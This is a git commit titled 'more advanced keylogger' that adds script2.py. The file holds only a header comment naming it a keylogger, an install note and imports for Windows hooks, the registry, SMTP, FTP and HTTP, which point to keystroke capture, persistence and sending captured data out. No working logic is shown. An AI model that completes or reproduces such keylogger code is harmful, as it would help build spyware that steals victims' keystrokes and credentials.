1f57b95799732a59ce98541abc53cc3f9fc10176
Aleksit0 <50078646+Aleksit0@users.noreply.github.com>
2021-08-05 13:23:34 +0200

    more advanced keylogger

---
+++ script2.py
@@ -0,0 +1,16 @@
+# MORE ADVANCED KEYLOGGER
+
+# TO INSTALL: pythoncom, pyHook
+
+import os
+import sys
+import threading
+import threading
+import urllib, urllib2
+import smtplib
+import ftplib
+import datetime, time
+import win32event, win32api, winerror
+from _winreg import *
+
+
